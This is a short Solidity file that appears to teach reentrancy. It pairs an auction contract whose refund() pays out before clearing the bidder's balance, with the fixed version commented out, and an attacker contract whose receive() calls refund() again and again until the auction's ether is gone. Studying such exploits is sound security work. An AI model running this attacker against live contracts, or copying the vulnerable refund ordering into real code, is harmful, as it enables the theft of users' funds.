pragma solidity ^0.8.19;

contract ReentrancyAuc {
    mapping(address => uint256) public bidders;

    function bid() public payable {
        bidders[msg.sender] += msg.value;
    }

    function refund() external {
        uint refundAmount = bidders[msg.sender];

        if (refundAmount > 0) {
            (bool success,) = msg.sender.call{value: refundAmount}("");

            require(success, "refund failed");

            bidders[msg.sender] = 0;
        }

        //if (refundAmount > 0) {
        //	bidders[msg.sender] = 0;
        //    (bool success,) = msg.sender.call{value: refundAmount}("");
        //    require(success, "refund failed");
        //} // fixed version -- check-effects-interactions pattern
    }

    function currentBalance() external view returns(uint) {
        return address(this).balance;
    }
}

contract ReentrancyAttack {
    uint constant BID_AMOUNT = 1 ether;
    ReentrancyAuc auction;

    constructor(address _auction) {
        auction = ReentrancyAuc(_auction);
    }

    function proxyBid() external payable {
        require (msg.value == BID_AMOUNT, "incorrect");
        auction.bid{value: msg.value}();
    }

    function attack() external {
        auction.refund();
    }

    receive() external payable {
        if (auction.currentBalance() >= BID_AMOUNT) {
            auction.refund(); // recursion of refund() -- reetrancy attack
        }
    }

    function currentBalance() external view returns(uint) {
        return address(this).balance;
    }
}